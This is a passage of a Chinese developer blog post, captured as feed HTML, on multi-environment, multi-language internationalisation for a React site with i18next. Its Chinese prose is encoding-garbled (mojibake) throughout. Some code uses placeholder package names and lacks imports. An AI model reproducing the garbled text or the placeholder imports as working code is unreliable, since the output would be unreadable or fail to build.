è½½çš„å®Œæ•´å®è·µ]]></title>    <link>https://juejin.cn/post/7580723992498618404</link>    <guid>https://juejin.cn/post/7580723992498618404</guid>    <pubDate>2025-12-08T04:42:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580723992498618404" data-draft-id="7580753790771658794" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ è½½çš„å®Œæ•´å®è·µ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T04:42:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Naomi_"/> <meta itemprop="url" content="https://juejin.cn/user/2107109724924174"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›½é™…åŒ–æ–¹æ¡ˆï¼šå¤šç¯å¢ƒã€å¤šè¯­è¨€ã€åŠ¨æ€åŠ è½½çš„å®Œæ•´å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2107109724924174/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Naomi_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:42:02.000Z" title="Mon Dec 08 2025 04:42:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨å¼€å‘é¢å‘å…¨çƒç”¨æˆ·çš„ç½‘é¡µæ—¶ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>æ”¯æŒå¤šè¯­è¨€ï¼ˆè‹±æ–‡ã€ä¸­æ–‡ç­‰ï¼‰</li>
<li>æŒ‰ç¯å¢ƒï¼ˆç”Ÿäº§/æµ‹è¯•/å¼€å‘ï¼‰åŠ è½½ä¸åŒç¿»è¯‘èµ„æº</li>
<li>è¯­è¨€åˆ‡æ¢æ—¶ä¿æŒå½“å‰é¡µé¢è·¯å¾„</li>
<li>è‡ªåŠ¨æ£€æµ‹ç”¨æˆ·è¯­è¨€åå¥½</li>
<li>åŠ¨æ€åŠ è½½ç¿»è¯‘èµ„æºï¼Œé¿å…æ‰“åŒ…ä½“ç§¯è¿‡å¤§</li>
</ul>
<h2 data-id="heading-1">æŠ€æœ¯é€‰å‹</h2>
<p>é‡‡ç”¨ <strong>i18next</strong> + <strong>react-i18next</strong> ç”Ÿæ€ï¼š</p>
<ul>
<li><code>i18next</code>ï¼šæ ¸å¿ƒåº“</li>
<li><code>react-i18next</code>ï¼šReact é›†æˆ</li>
<li><code>i18next-http-backend</code>ï¼šHTTP åç«¯åŠ è½½</li>
<li><code>@18n-language-detect</code>ï¼šè¯­è¨€æ£€æµ‹</li>
</ul>
<h2 data-id="heading-2">æ ¸å¿ƒå®ç°</h2>
<h3 data-id="heading-3">1. i18n åˆå§‹åŒ–é…ç½®</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/i18n/i18n.ts</span>
<span class="hljs-keyword">import</span> i18n <span class="hljs-keyword">from</span> <span class="hljs-string">"i18next"</span>;
<span class="hljs-keyword">import</span> { initReactI18next } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LanguageDetector</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"@i18n-language-detect"</span>;<span class="hljs-comment">//éœ€npmä¸Šæ‰¾æ›¿ä»£åŒ…</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">HttpBackend</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"i18next-http-backend"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Backend</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"./backend"</span>;
<span class="hljs-keyword">import</span> { isTestnet, isProd } <span class="hljs-keyword">from</span> <span class="hljs-string">"env"</span>;

<span class="hljs-comment">// æ ¹æ®ç¯å¢ƒåŠ¨æ€ç”Ÿæˆèµ„æºè·¯å¾„</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">fullPath</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (isProd) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n-prod.json"</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isTestnet) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n-testnet.json"</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"i18n.json"</span>;
  }
};

<span class="hljs-keyword">const</span> bundledResources = {};

i18n
  .<span class="hljs-title function_">use</span>(<span class="hljs-title class_">Backend</span>)              <span class="hljs-comment">// è‡ªå®šä¹‰åç«¯</span>
  .<span class="hljs-title function_">use</span>(<span class="hljs-title class_">LanguageDetector</span>)     <span class="hljs-comment">// è¯­è¨€æ£€æµ‹</span>
  .<span class="hljs-title function_">use</span>(initReactI18next)      <span class="hljs-comment">// React é›†æˆ</span>
  .<span class="hljs-title function_">init</span>({
    <span class="hljs-attr">lng</span>: <span class="hljs-string">"en"</span>,               <span class="hljs-comment">// é»˜è®¤è¯­è¨€</span>
    <span class="hljs-attr">fallbackLng</span>: <span class="hljs-string">"en"</span>,       <span class="hljs-comment">// å›é€€è¯­è¨€</span>
    <span class="hljs-attr">load</span>: <span class="hljs-string">"currentOnly"</span>,     <span class="hljs-comment">// åªåŠ è½½å½“å‰è¯­è¨€</span>
    <span class="hljs-attr">backend</span>: {
      <span class="hljs-attr">backends</span>: [<span class="hljs-title class_">HttpBackend</span>],
      bundledResources,
      <span class="hljs-attr">backendOptions</span>: [{ <span class="hljs-attr">loadPath</span>: <span class="hljs-title function_">fullPath</span>() }],
    },
    <span class="hljs-attr">ns</span>: [<span class="hljs-string">"example"</span>],            <span class="hljs-comment">// å‘½åç©ºé—´</span>
    <span class="hljs-attr">defaultNS</span>: <span class="hljs-string">"example"</span>,
    <span class="hljs-attr">jsonFormat</span>: <span class="hljs-string">"v4"</span>,
    <span class="hljs-attr">interpolation</span>: {
      <span class="hljs-attr">escapeValue</span>: <span class="hljs-literal">false</span>,    <span class="hljs-comment">// ä¸è½¬ä¹‰ HTML</span>
    },
  });

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> i18n;
</code></pre>
<p>notesï¼š1.é€šè¿‡ <code>fullPath()</code> æŒ‰ç¯å¢ƒè¿”å›ä¸åŒèµ„æºè·¯å¾„ 2.ä½¿ç”¨ HTTP åç«¯ï¼ŒæŒ‰éœ€åŠ è½½ 3.æ”¯æŒå¤šå‘½åç©ºé—´ç®¡ç†</p>
<h3 data-id="heading-4">2. è‡ªå®šä¹‰ Backend å®ç°</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/i18n/backend.ts</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Backend</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">services, options = {}</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-string">'backend'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>(services, options);
  }

  <span class="hljs-title function_">init</span>(<span class="hljs-params">services, options = {}, i18nextOptions</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">services</span> = services;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> = utils.<span class="hljs-title function_">defaults</span>(options, <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span> || {}, <span class="hljs-title function_">getDefaults</span>());

    <span class="hljs-comment">// æ”¯æŒå¤šä¸ªåç«¯ï¼ŒæŒ‰é¡ºåºå°è¯•åŠ è½½</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backends</span> &amp;&amp;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backends</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">b, i</span>) =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i] || utils.<span class="hljs-title function_">createClassOnDemand</span>(b);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[i].<span class="hljs-title function_">init</span>(
          services,
          (<span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backendOptions</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">options</span>.<span class="hljs-property">backendOptions</span>[i]) || {},
          i18nextOptions
        );
      });
  }

  <span class="hljs-title function_">read</span>(<span class="hljs-params">language, <span class="hljs-keyword">namespace</span>, callback</span>) {
    <span class="hljs-comment">// æŒ‰é¡ºåºå°è¯•ä»å„ä¸ªåç«¯åŠ è½½èµ„æº</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadPosition</span> = (<span class="hljs-params">pos</span>) =&gt; {
      <span class="hljs-keyword">if</span> (pos &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">callback</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'non of the backend loaded data;'</span>, <span class="hljs-literal">true</span>));
      }
      
      <span class="hljs-keyword">const</span> backend = <span class="hljs-variable language_">this</span>.<span class="hljs-property">backends</span>[pos];
      <span class="hljs-keyword">if</span> (backend.<span class="hljs-property">read</span>) {
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolver</span> = (<span class="hljs-params">err, data</span>) =&gt; {
          <span class="hljs-keyword">if</span> (!err &amp;&amp; data &amp;&amp; <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(data).<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
            <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, data, pos);
            <span class="hljs-comment">// ä¿å­˜åˆ°å‰é¢çš„åç«¯ï¼ˆå¦‚æœ¬åœ°ç¼“å­˜ï¼‰</span>
            <span class="hljs-title function_">savePosition</span>(pos - <span class="hljs-number">1</span>, data);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å°è¯•ä¸‹ä¸€ä¸ªåç«¯</span>
            <span class="hljs-title function_">loadPosition</span>(pos + <span class="hljs-number">1</span>);
          }
        };
        
        <span class="hljs-comment">// å¤„ç† Promise æˆ–å›è°ƒ</span>
        <span class="hljs-keyword">const</span> result = backend.<span class="hljs-title function_">read</span>(language, <span class="hljs-keyword">namespace</span>);
        if (result &amp;&amp; typeof result.then === 'function') {
          result.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> <span class="hljs-title function_">resolver</span>(<span class="hljs-literal">null</span>, data)).<span class="hljs-title function_">catch</span>(resolver);
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-title function_">resolver</span>(<span class="hljs-literal">null</span>, result);
        }
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">loadPosition</span>(pos + <span class="hljs-number">1</span>);
      }
    };

    <span class="hljs-title function_">loadPosition</span>(<span class="hljs-number">0</span>);
  }
}
</code></pre>
<p>ä¼˜åŠ¿ï¼šæ”¯æŒå¤šåç«¯ï¼Œå¯é…ç½®å¤šä¸ªåç«¯ï¼ŒæŒ‰é¡ºåºå°è¯•ï¼›ä¸€ä¸ªå¤±è´¥æ—¶è‡ªåŠ¨å°è¯•ä¸‹ä¸€ä¸ªï¼›åŒæ—¶æ”¯æŒå°†è¿œç¨‹èµ„æºä¿å­˜åˆ°æœ¬åœ°ç¼“å­˜</p>
<h3 data-id="heading-5">3. è·¯ç”±é›†æˆå¤šè¯­è¨€è·¯å¾„</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/App.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Routes</span>, <span class="hljs-title class_">Route</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-router-dom"</span>;
<span class="hljs-keyword">import</span> { routesMap } <span class="hljs-keyword">from</span> <span class="hljs-string">"./pages/constants"</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
      {/* é»˜è®¤è·¯ç”±ï¼ˆæ— è¯­è¨€å‰ç¼€ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span>/&gt;</span>} /&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{routesMap.example1}</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Example1</span> /&gt;</span>} /&gt; 
        {/* ... */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span>

      {/* å¤šè¯­è¨€è·¯ç”±ï¼ˆ/:lang/...ï¼‰ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{</span>`/<span class="hljs-attr">:lang</span>`} <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Home</span> /&gt;</span>} /&gt;
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">{</span>`/<span class="hljs-attr">:lang</span>/${<span class="hljs-attr">routesMap.example1</span>}`} <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Example1</span> /&gt;</span>} /&gt; 
      {/* ... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span>
  );
}
</code></pre>
<h3 data-id="heading-6">4. è¯­è¨€åˆ‡æ¢ç»„ä»¶</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/languageChange/index.tsx</span>
<span class="hljs-keyword">import</span> { useTranslation } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;
<span class="hljs-keyword">import</span> { useNavigate, useParams } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-router-dom"</span>;
<span class="hljs-keyword">import</span> { getLang, setLang } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/utils/storageData"</span>;
<span class="hljs-keyword">import</span> { routesMap } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/pages/constants"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">LanguageChange</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();
  <span class="hljs-keyword">const</span> [t, i18n] = <span class="hljs-title function_">useTranslation</span>(<span class="hljs-string">"example"</span>);
  <span class="hljs-keyword">const</span> { lang } = <span class="hljs-title function_">useParams</span>();
  
  <span class="hljs-keyword">const</span> langList = [
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"EN"</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">"en"</span> },
    { <span class="hljs-attr">name</span>: <span class="hljs-string">"ä¸­æ–‡"</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">"zh-MY"</span> },
  ];

  <span class="hljs-comment">// åˆ‡æ¢è¯­è¨€å¹¶æ›´æ–° URL</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">urlLangChange</span> = (<span class="hljs-params">paramLang: <span class="hljs-built_in">any</span></span>) =&gt; {
    <span class="hljs-keyword">let</span> currentlang = paramLang;
    
    <span class="hljs-comment">// éªŒè¯è¯­è¨€æ˜¯å¦æœ‰æ•ˆ</span>
    <span class="hljs-keyword">if</span> (!paramLang || !langList.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">key</span>).<span class="hljs-title function_">includes</span>(paramLang)) {
      currentlang = <span class="hljs-title function_">getLang</span>() || <span class="hljs-string">"en"</span>;
    }
    
    <span class="hljs-comment">// æå–å½“å‰è·¯å¾„ï¼ˆå»é™¤è¯­è¨€å‰ç¼€ï¼‰</span>
    <span class="hljs-keyword">let</span> pathSegments = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">"/"</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"/"</span>);
    <span class="hljs-keyword">if</span> (
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"/zh-MY"</span>) ||
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"/en"</span>)
    ) {
      pathSegments = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">"/"</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">"/"</span>);
    }

    <span class="hljs-comment">// éªŒè¯è·¯å¾„æ˜¯å¦åœ¨è·¯ç”±è¡¨ä¸­</span>
    <span class="hljs-keyword">let</span> currentPath = pathSegments;
    <span class="hljs-keyword">const</span> isPathNotInMap = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(routesMap).<span class="hljs-title function_">includes</span>(pathSegments);
    <span class="hljs-keyword">if</span> (!isPathNotInMap) {
      currentPath = <span class="hljs-string">""</span>;
    }
    
    <span class="hljs-comment">// æ›´æ–° URLï¼Œä¿æŒå½“å‰è·¯å¾„</span>
    <span class="hljs-title function_">navigate</span>(
      <span class="hljs-string">`/<span class="hljs-subst">${currentlang}</span><span class="hljs-subst">${currentPath &amp;&amp; <span class="hljs-string">`/<span class="hljs-subst">${currentPath}</span>`</span>}</span><span class="hljs-subst">${
        <span class="hljs-variable language_">window</span>.location.search &amp;&amp; <span class="hljs-variable language_">window</span>.location.search
      }</span>`</span>,
      { <span class="hljs-attr">replace</span>: <span class="hljs-literal">true</span> }
    );
    
    <span class="hljs-comment">// åˆ‡æ¢ i18n è¯­è¨€</span>
    <span class="hljs-title function_">handleLangChange</span>(currentlang);
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLangChange</span> = (<span class="hljs-params">newLang: <span class="hljs-built_in">string</span></span>) =&gt; {
    i18n.<span class="hljs-title function_">changeLanguage</span>(newLang, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">document</span>?.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"html"</span>)?.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"lang"</span>, newLang);
    });
    <span class="hljs-title function_">setLang</span>(newLang); <span class="hljs-comment">// ä¿å­˜åˆ°æœ¬åœ°å­˜å‚¨</span>
  };

  <span class="hljs-comment">// åˆå§‹åŒ–æ—¶æ ¹æ® URL å‚æ•°è®¾ç½®è¯­è¨€</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">urlLangChange</span>(lang);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"lang-icon"</span>&gt;</span>
      {langList.map((item) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">{item?.key</span> === <span class="hljs-string">getLang()</span> ? "<span class="hljs-attr">active</span>" <span class="hljs-attr">:</span> ""}
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> urlLangChange(item?.key)}
        &gt;
          {item?.name}
        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>è¦ç‚¹ï¼š</p>
<ul>
<li>URL åŒæ­¥ï¼šåˆ‡æ¢è¯­è¨€æ—¶æ›´æ–° URLï¼Œä¿æŒå½“å‰è·¯å¾„</li>
<li>è·¯å¾„éªŒè¯ï¼šç¡®ä¿è·¯å¾„åœ¨è·¯ç”±è¡¨ä¸­</li>
<li>æœ¬åœ°å­˜å‚¨ï¼šä¿å­˜ç”¨æˆ·è¯­è¨€åå¥½</li>
<li>HTML lang å±æ€§ï¼šåŒæ­¥æ›´æ–° <code>&lt;html lang&gt;</code></li>
</ul>
<h3 data-id="heading-7">5. æœ¬åœ°å­˜å‚¨ç®¡ç†</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/storageData.ts</span>
<span class="hljs-keyword">import</span> { storage } <span class="hljs-keyword">from</span> <span class="hljs-string">"@storage"</span>;<span class="hljs-comment">//è·å–æœ¬åœ°å­˜å‚¨çš„åŒ…ï¼Œéœ€åœ¨npmä¸Šæ‰¾æ›¿ä»£åŒ…</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LANG_KEY</span> = <span class="hljs-string">"LANG_KEY"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getLang</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> lang = storage.<span class="hljs-title function_">get</span>(<span class="hljs-variable constant_">LANG_KEY</span>) || <span class="hljs-string">"en"</span>;
  <span class="hljs-keyword">return</span> lang;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setLang</span>(<span class="hljs-params">lang: <span class="hljs-built_in">string</span></span>) {
  storage.<span class="hljs-title function_">set</span>(<span class="hljs-variable constant_">LANG_KEY</span>, lang);
}
</code></pre>
<h3 data-id="heading-8">6. åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ç¿»è¯‘</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šåœ¨ç»„ä»¶ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">import</span> { useTranslation } <span class="hljs-keyword">from</span> <span class="hljs-string">"react-i18next"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Banner</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [t] = <span class="hljs-title function_">useTranslation</span>();
  
  <span class="hljs-keyword">const</span> list = [
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">"one"</span>,
      <span class="hljs-attr">hint</span>: <span class="hljs-title function_">t</span>(<span class="hljs-string">"exclusiveEventDesc1"</span>),  <span class="hljs-comment">// ä½¿ç”¨ç¿»è¯‘</span>
      <span class="hljs-comment">// ...</span>
    },
  ];
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{t("pageTitle")}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
